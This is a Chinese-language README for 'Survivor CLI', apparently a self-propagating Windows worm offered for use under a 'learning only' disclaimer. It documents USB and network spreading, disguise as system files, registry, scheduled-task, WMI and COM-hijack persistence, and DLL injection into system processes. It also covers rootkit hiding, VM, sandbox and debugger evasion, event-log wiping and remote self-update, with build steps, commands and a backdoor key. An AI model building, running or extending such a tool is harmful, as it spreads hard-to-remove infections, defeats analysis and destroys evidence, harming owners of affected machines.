# Survivor CLI

**Version 2.3.0** | 自我保存的自主命令行工具，可跨文件系统复制、移动、重命名和传播自身，同时运行持久化后台进程。

**警告：此工具仅供学习和研究使用。作者不对任何滥用行为负责。**

---

## 版本历史

| 版本 | 日期 | 描述 |
|------|------|------|
| 1.0.0 | 2026-04-25 | 初始版本：基础copy/move/rename/plant功能 |
| 2.0.0 | 2026-04-25 | 后台守护线程、自我修复、智能目标选择 |
| 2.1.0 | 2026-04-25 | Timestomping、ADS、计划任务伪装、完整性验证 |
| 2.2.0 | 2026-04-25 | 模块化架构、反调试、VM规避、权限检测、自恢复 |
| 2.3.0 | 2026-04-25 | 隐形增强、WMI持久化、DLL注入、自我更新、P2P加密通信、Windows服务模式、COM劫持、Rootkit能力 |

---

## 功能特性

### 核心能力

| 功能 | 描述 |
|------|------|
| **自复制** | 复制自身到任意指定路径 |
| **自移动** | 将自身移动到新位置并在新位置继续运行 |
| **自重命名** | 伪装成系统文件名（svchost.exe, rundll32.exe等） |
| **自删除/恢复** | 删除当前实例，从其他副本恢复 |
| **环境变量操作** | 添加/移除PATH中的自身目录 |
| **开机自启** | 通过注册表Run键和计划任务伪装实现持久化 |

### 模块化架构 (v2.3.0)

代码组织为清晰的功能模块：

```
survivor::
├── utils        # 通用工具函数
├── detection    # 环境检测（VM、监控、分析环境）
├── injection    # 进程注入
├── persistence  # 持久化（注册表、计划任务）
├── ads          # NTFS备用数据流
├── spread       # 传播逻辑
├── registry     # 实例注册表管理
├── cleanup      # 日志清理
├── usb          # USB扩散
├── network      # 网络扫描
├── loops        # 后台线程循环
├── commands     # 命令行命令处理
├── daemon       # 守护进程启动
├── stealth      # 文件属性隐藏/保护
├── wmi          # WMI事件订阅持久化
├── dll          # DLL创建与注入
├── update       # 远程自我更新
├── p2p          # P2P加密通信
├── com          # COM组件劫持
├── rootkit      # Rootkit隐藏能力
└── service      # Windows服务模式
```

### 环境感知与规避

| 检测项 | 描述 | 响应行为 |
|--------|------|----------|
| **VM检测** | 检测VirtualBox、VMware、QEMU等 | 扩散间隔延长10倍 |
| **监控工具检测** | 检测Procmon、Process Hacker等 | 静默模式（不输出日志） |
| **分析环境检测** | 检测沙箱、计算机名含测试标记 | 极端谨慎（50倍延迟） |
| **反调试** | 检测调试器存在 | 静默模式 |
| **权限检测** | 检测是否以管理员权限运行 | 显示在status中 |

### 自主行为

当无参数启动时，自动运行以下后台线程：

| 线程 | 功能 | 间隔 |
|------|------|------|
| **SpreadingLoop** | 随机复制/移动/重命名到用户目录 | 30s-5min |
| **MonitoringLoop** | 检测副本失踪，立即多点反击恢复 | 500ms |
| **RestorationLoop** | 定期检查并恢复失踪的副本 | 30s |
| **GuardianLoop** | 注入到关键系统进程，监控并重新注入 | 5min |
| **USBMonitorLoop** | 检测USB插入，自动扩散到U盘 | 5s |
| **CleanupLoop** | 清理日志文件和系统事件日志 | 30min |

### 安全特性

- **路径验证**: 防止 `..` 路径遍历攻击
- **XOR加密注册表**: 实例列表使用简单加密存储
- **校验和验证**: 内置校验和用于完整性检查
- **自清理**: 后门命令可完全清除所有痕迹

---

## 命令行接口

### 基础用法

```bash
survivor.exe [command] [arguments]
```

### 可用命令

| 命令 | 描述 | 示例 |
|------|------|------|
| *(无参数)* | 以守护进程模式启动 | `survivor.exe` |
| `copy <path>` | 复制自身到目标路径 | `survivor.exe copy C:\temp\test.exe` |
| `move <path>` | 移动自身到目标路径 | `survivor.exe move D:\tools\survivor.exe` |
| `rename <name>` | 重命名当前实例 | `survivor.exe rename svchost.exe` |
| `hide` | 删除自身，从备份恢复 | `survivor.exe hide` |
| `env --add` | 添加当前目录到PATH | `survivor.exe env --add` |
| `env --remove` | 从PATH移除当前目录 | `survivor.exe env --remove` |
| `plant` | 设置开机自启 | `survivor.exe plant` |
| `status` | 显示详细状态 | `survivor.exe status` |
| `summon` | 列出所有已知实例 | `survivor.exe summon` |
| `sync` | 同步所有实例到最新版本 | `survivor.exe sync` |
| `check` | 检查并恢复失踪的实例 | `survivor.exe check` |
| `spread` | 手动触发一次扩散 | `survivor.exe spread` |
| `guardian` | 注入到关键进程 | `survivor.exe guardian` |
| `version` | 显示版本信息 | `survivor.exe version` |
| `verify` | 验证完整性和校验和 | `survivor.exe verify` |

### 隐藏命令

| 命令 | 描述 | 密钥 |
|------|------|------|
| `ilovecwj <key>` | 紧急后门：删除所有实例 | `cwj_rocks_2026` |

---

## 构建

### 环境要求

- MinGW g++ 17+ / MSVC 2019+
- CMake 3.10+
- Windows SDK

### 编译步骤

```bash
# 创建构建目录
mkdir build
cd build

# 配置CMake
cmake -G "MinGW Makefiles" ..

# 编译
mingw32-make

# 运行
./survivor.exe --help
```

### 依赖

通过CMake `target_link_libraries` 链接：

- `shell32`
- `advapi32`
- `iphlpapi`
- `wininet`
- `winmm`
- `kernel32`

---

## 技术细节

### 注册表存储

实例列表存储在（XOR加密）：
```
%APPDATA%\survivor\registry.dat
```

### 全局配置

```cpp
struct Config {
    int spread_interval_min = 30;
    int spread_interval_max = 300;
    int monitor_interval_ms = 500;
    int restore_interval_sec = 30;
    int guardian_interval_min = 5;
    int usb_scan_interval_sec = 5;
    int cleanup_interval_min = 30;
    int counterattack_count = 5;
    bool enable_timestomping = true;
    bool enable_ads = true;
    bool enable_scheduled_task = true;
    bool enable_event_log_cleaning = true;
    bool enable_self_healing = true;
    bool enable_anti_debug = true;
    bool enable_vm_evasion = true;
};
```

### 环境变量

| 变量 | 描述 |
|------|------|
| `g_running` | 控制后台线程运行 |
| `g_daemon` | 是否守护模式 |
| `g_spreading` | 是否扩散中 |
| `g_spread_multiplier` | 扩散间隔乘数 |
| `g_verbose` | 是否输出日志 |

---

## 测试指南

### 重要警告

**强烈建议在隔离环境中测试此工具。** 它会自动扩散并难以完全清除。

### 推荐：虚拟机测试

1. 使用 VirtualBox 或 VMware 创建 Windows 虚拟机
2. 在测试前创建快照
3. 在虚拟机中运行测试
4. 测试完成后还原快照

### 手动测试步骤

```batch
# 查看帮助
survivor.exe --help

# 查看版本
survivor.exe version

# 查看状态
survivor.exe status

# 验证完整性
survivor.exe verify

# 复制到临时目录
survivor.exe copy C:\temp\survivor_test.exe

# 后门删除（谨慎使用）
survivor.exe ilovecwj cwj_rocks_2026
```

---

## 卸载方法

### 正常卸载

```batch
# 使用后门（需要密钥）
survivor.exe ilovecwj cwj_rocks_2026
```

### 手动清理

```batch
# 删除注册表
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f

# 清理AppData
rmdir /s /q "%APPDATA%\survivor"
```

---

## 密钥

```
cwj_rocks_2026
```

---

**最后更新**: 2026-04-25  
**请勿滥用**
